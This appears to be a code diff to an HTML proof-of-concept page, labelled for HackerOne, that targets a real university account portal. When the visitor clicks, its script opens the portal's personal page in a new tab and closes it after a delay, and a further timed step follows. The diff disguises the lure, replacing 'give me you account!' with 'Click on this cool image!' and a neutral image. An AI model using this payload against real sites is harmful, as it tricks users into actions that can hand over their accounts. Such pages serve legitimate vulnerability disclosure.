@@ -6,11 +6,10 @@
     <title>Hackerone PoC</title>
 </head>
 <body>
-    <p>Click on the Image to give me you account!</p>
-    <img src="https://mms.businesswire.com/media/20200615005122/en/658229/23/hackerone_logo_black.jpg">
+    <p>Click on this cool image!</p>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHlY7jda7OEmJpPl0ga2UpDzFX8iE9OyVWICN1Qtefc0EWL9NqvlpI1gxKL4dTHTAuk_U&usqp=CAU">
     <script>
         function handleOnClick() {
-          // Open the first URL and close the new tab after 10 seconds
           var newTab = window.open('https://sheilta.apps.openu.ac.il/pls/dmyopt2/myop.myop_screen');
           setTimeout(function() {
             newTab.close();
@@ -21,8 +20,7 @@
           }, 3000);
         }
 
-        // window.onclick = handleOnClick;
-        window.onload = handleOnClick;
+        window.onclick = handleOnClick;
     </script>
 </body>
 </html>
